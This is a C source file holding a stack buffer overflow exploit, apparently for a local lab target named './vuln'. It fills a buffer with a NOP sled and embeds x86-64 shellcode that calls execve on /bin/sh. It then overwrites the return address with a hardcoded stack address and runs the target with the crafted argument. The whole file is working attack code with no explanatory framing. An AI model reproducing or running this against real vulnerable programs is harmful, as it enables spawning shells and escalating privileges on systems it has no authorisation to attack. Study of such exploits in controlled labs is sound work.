#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define NOP 0x90
#define OFFSET 80


char shellcode[] =
    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
    "\x52"                                          // push   %rdx
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"      // mov $0x68732f6e69622f, %rbx
    "\x53"                                          // push   %rbx
    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
    "\x50"                                          // push   %rax
    "\x57"                                          // push   %rdi
    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
    "\xb0\x3b"                                      // mov    $0x3b, %al
    "\x0f\x05";                                     // syscall

int main(int argc, char *argv[]) {
    char buffer[OFFSET + 8];
    void *ret_addr = (void *)0x7fffffffe1b8;

    memset(buffer, NOP, OFFSET);
    memcpy(buffer + OFFSET - sizeof(shellcode), shellcode, sizeof(shellcode));
    memcpy(buffer + OFFSET, &ret_addr, 8);

    printf("Ejecutando exploit...\n");
    execl("./vuln", "vuln", buffer, NULL);

    return 0;
}
